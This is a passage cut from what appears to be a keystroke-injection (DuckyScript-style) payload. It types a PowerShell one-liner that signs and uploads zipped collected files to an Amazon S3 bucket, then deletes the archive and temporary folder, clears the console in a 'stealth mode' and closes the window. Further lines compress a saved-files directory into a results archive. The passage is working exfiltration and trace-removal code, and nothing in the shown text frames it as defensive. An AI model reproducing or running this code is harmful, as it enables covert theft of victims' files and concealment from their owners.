[System.Security.Cryptography.SHA256]::Create().ComputeHash($fileContent) | ForEach-Object { $_.ToString('x2') } | Join-String; $canonical_headers = 'host:' + $host + [System.Environment]::NewLine + 'x-amz-content-sha256:' + $payload_hash + [System.Environment]::NewLine + 'x-amz-date:' + $dateValue + [System.Environment]::NewLine; $signed_headers = 'host;x-amz-content-sha256;x-amz-date'; $canonical_request = 'PUT' + [System.Environment]::NewLine + $canonical_uri + [System.Environment]::NewLine + $canonical_querystring + [System.Environment]::NewLine + $canonical_headers + [System.Environment]::NewLine + $signed_headers + [System.Environment]::NewLine + $payload_hash; $canonical_request_hash = [System.Security.Cryptography.SHA256]::Create().ComputeHash([System.Text.Encoding]::UTF8.GetBytes($canonical_request)) | ForEach-Object { $_.ToString('x2') } | Join-String; $string_to_sign = 'AWS4-HMAC-SHA256' + [System.Environment]::NewLine + $dateValue + [System.Environment]::NewLine + $datestamp + '/' + $s3Region + '/s3/aws4_request' + [System.Environment]::NewLine + $canonical_request_hash; $kDate = [System.Security.Cryptography.HMACSHA256]::new([System.Text.Encoding]::UTF8.GetBytes('AWS4' + $secretKey)).ComputeHash([System.Text.Encoding]::UTF8.GetBytes($datestamp)); $kRegion = [System.Security.Cryptography.HMACSHA256]::new($kDate).ComputeHash([System.Text.Encoding]::UTF8.GetBytes($s3Region)); $kService = [System.Security.Cryptography.HMACSHA256]::new($kRegion).ComputeHash([System.Text.Encoding]::UTF8.GetBytes('s3')); $kSigning = [System.Security.Cryptography.HMACSHA256]::new($kService).ComputeHash([System.Text.Encoding]::UTF8.GetBytes('aws4_request')); $signature = [System.Security.Cryptography.HMACSHA256]::new($kSigning).ComputeHash([System.Text.Encoding]::UTF8.GetBytes($string_to_sign)) | ForEach-Object { $_.ToString('x2') } | Join-String; $authorization_header = 'AWS4-HMAC-SHA256 Credential=' + $accessKey + '/' + $datestamp + '/' + $s3Region + '/s3/aws4_request, SignedHeaders=' + $signed_headers + ', Signature=' + $signature; $headers = @{'Authorization'=$authorization_header; 'x-amz-date'=$dateValue; 'x-amz-content-sha256'=$payload_hash; 'Content-Length'=$fileContent.Length}; Invoke-RestMethod -Uri ('https://' + $host + $canonical_uri) -Method Put -Headers $headers -Body $fileContent -TimeoutSec 30; Log 'AWS S3 upload successful'; Write-Host 'Uploaded to AWS S3'; $uploaded = $true; } } } Catch { Log 'AWS S3 upload failed'; } }; Remove-Item $zipPath -Force -ErrorAction SilentlyContinue; }; Remove-Item $tempDir -Recurse -Force -ErrorAction SilentlyContinue; Log 'Cleanup complete'; if ($stealthMode) { clear; }; exit
 ENTER
-STRING Compress-Archive -Path $fileSaveDir -DestinationPath PATH\results-61748762.zip ; exit 
-ENTER
+DELAY 1000
+WINDOWS t
+DELAY 500
+ALT F4
+DELAY 500
